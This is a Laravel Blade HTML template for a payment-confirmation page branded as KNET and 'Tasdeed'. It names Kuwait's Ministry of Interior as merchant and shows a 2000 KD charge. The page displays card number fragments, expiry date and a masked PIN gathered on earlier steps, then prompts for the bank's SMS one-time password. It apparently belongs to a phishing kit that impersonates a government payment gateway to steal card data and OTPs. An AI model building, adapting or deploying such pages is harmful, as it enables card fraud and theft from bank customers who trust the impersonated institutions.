<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=500, initial-scale=1">
	
    <title>نظام تسديد - الدفع الإلكتروني</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
		.container {
			width: 100%;
			max-width: 1200px;
			margin: 0 auto;
		}
        .custom-box {
            border: 2px solid #3288d1;
            border-radius: 10px;
            box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.4);
            padding: 20px;
            background-color: #ffffff;
            text-align: center;
            position: relative;
            max-width: 500px;
            margin: auto;
        }
        .logo-container {
            width: 100%;
            height: 150px;
            background-color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: bold;
            color: #777;
            margin-bottom: 10px;
        }
        .logo-placeholder {
            width: 100px;
            height: 100px;
            background-color: #e0e0e0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: bold;
            color: #777;
            margin: 0 auto 10px auto;
        }
        .divider {
            width: 85%;
            height: 0.2px;
            background-color: rgba(0, 0, 0, 0.2);
            box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.4);
            margin: -19px auto 0 auto;
        }
        .billing-title {
            font-size: 16px;
            font-weight: bold;
            color: #3288d1;
            text-align: left;
            margin-top: 25px;
            margin-left: 20px;
            font-weight: bold;
        }
        .billing-info {
            font-size: 13px;
            font-weight: bold;
            color: #3288d1;
            text-align: left;
			left: 30px;
            width: 30%;
        }
        .billing-value {
            font-size: 13px;
            font-weight: bold;
			position: relative;
            color: #454e5f;
            text-align: left;
			left: 10px;
            width: 70%;
        }
        .billing-row {
            display: flex;
            align-items: center;
            justify-content: start;
            margin-top: 10px;
            padding-left: 50px;
        }
        .select-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 10px;
            padding-left: 50px;
            padding-right: 50px;
        }
        .select-row select {
			margin-left: 20px; /* زود الرقم لو عاوز تبعدها أكتر */
            width: 70%;
            padding: 5px;
            border: 1px solid #000000;
        }
        .select-row button {
            background-color: #3288d1;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
        }
		select {
			appearance: auto; /* يخليها بالشكل الافتراضي القديم */
			font-family: Arial, sans-serif;
			font-size: 14px;
			padding: 4px;
			border: 0px solid black;
			width: 2100px ;
			height: 28px;
		}
		.old-select {
			font-family: Arial, sans-serif;
			font-size: 14px;
			border: 1px solid #000;
			background-color: #f8f8f8;
			padding: 3px;
			width: 18%;
			height: 26px;

		}
		
		.payment-banner {
            width: 100%;
            max-width: 500px; 
            display: block;
            margin: 0 auto 15px auto;
            border-radius: 10px;
        }
        .footer
        {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #777;
        }

    </style>
</head>
<body>
    <div class="container mt-5">
		<img src="{{asset('image/pc.jpg')}}" alt="Payment Image" class="payment-banner">
		<div class="custom-box">
			<img src="{{asset('image/tasdeed.png')}}" alt="" style="width: 270px; position:relative; top: -19px;">
			<div class="divider"></div>
            <p class="alert alert-info mt-3">
            <span> NOTIFICATION :</span>
             You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.
        </p>
            <div class="billing-title">Billing Information</div>
            <div class="billing-row">
                <div class="billing-info">Merchent:</div>
                <div class="billing-value">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ministry of Interior</div>
            </div>
            <div class="billing-row">
                <div class="billing-info">Website:</div>
                <div class="billing-value">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.moi.gov.kw</div>
            </div>
            <div class="billing-row" style="margin-bottom: 5px;">
                <div class="billing-info">Amount:</div>
                <div class="billing-value">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KD 2000</div>
            </div>
            
            <div class="billing-title" style="margin-top: 15px;">Card Information</div>
              
                <div class="billing-row">
                @php
                    $cardNumber = $form['card-number'] ?? '';
                    $firstSix = substr($cardNumber, 0, 6); // أول 6 أرقام
                    $lastFour = substr($cardNumber, -4); // آخر 4 أرقام
                @endphp
                    <label for="card-number" class="billing-info">Card Number:</label>
                    <span style="font-size: 15px;
                        font-weight: bold;
                        position: relative;
                        color: #454e5f;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{{ $firstSix }}*****{{ $lastFour }}</span>
                    
                </div>
                <div class="billing-row">
                    <label for="card-number" class="billing-info">Expiration month:</label>
                    <span style="font-size: 15px;
                        font-weight: bold;
                        position: relative;
                        color: #454e5f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{{ $form['month'] }}</span>
                </div>
                <div class="billing-row">
                    <label for="card-number" class="billing-info">Expiration year:</label>
                    <span style="font-size: 15px;
                        font-weight: bold;
                        position: relative;
                        color: #454e5f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{{ $form['year'] }}</span>
                </div>
                <div class="billing-row">
                    <label for="card-number" class="billing-info">pin:</label>
                        <span style="font-size: 15px;
                        font-weight: bold;
                        position: relative;
                        color: #454e5f;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;****</span>
                </div>
                
               
                <div class="billing-row">
                    <label class="billing-info">OTP:</label>
                    <input id="pin" type="text" placeholder="Timeout in 3:15" style="font-family: Arial, sans-serif;
                    font-size: 14px; 
                    border: 1px solid #3288d1; 
                    background-color: #f8f8f8; 
                    padding: 3px;
                    width: 150px; 
                    margin-left: 30px;">
                
            </div>
            <div class="buttons-container" style="text-align: center; margin-top: 13px; display: flex; justify-content: center; gap: 10px;">
            <a href="{{ route('last') }}" 
                style="display: inline-block; text-align: center; line-height: 30px; width: 113px; height: 30px; color:#1d1c1cd5; background-color: #e6e6e6; border: 1px solid #999; font-family: Arial, sans-serif; font-size: 14px; font-weight: bold; text-decoration: none; cursor: pointer;">
                Confirm
            </a>

            <a href="{{ route('bcheckout') }}" 
                style="display: inline-block; text-align: center; line-height: 30px; width: 113px; height: 30px; color:#1d1c1cd5; background-color: #e6e6e6; border: 1px solid #999; font-family: Arial, sans-serif; font-size: 14px; font-weight: bold; text-decoration: none; cursor: pointer;">
                Back
            </a>

            <a href="{{ route('welcome') }}" 
                style="display: inline-block; text-align: center; line-height: 30px; width: 113px; height: 30px; color:#1d1c1cd5; background-color: #e6e6e6; border: 1px solid #999; font-family: Arial, sans-serif; font-size: 14px; font-weight: bold; text-decoration: none; cursor: pointer;">
                Cancel
            </a>

            </div>
        </div>	
    </div>
	<div class="footer">
		All Rights Reserved. Copyright 2025 &copy;<br>
		<span style="color: #3288d1;">
			The Shared Electronic Banking Services Company - KNET
		</span>
	</div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    


    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

</body>

</html>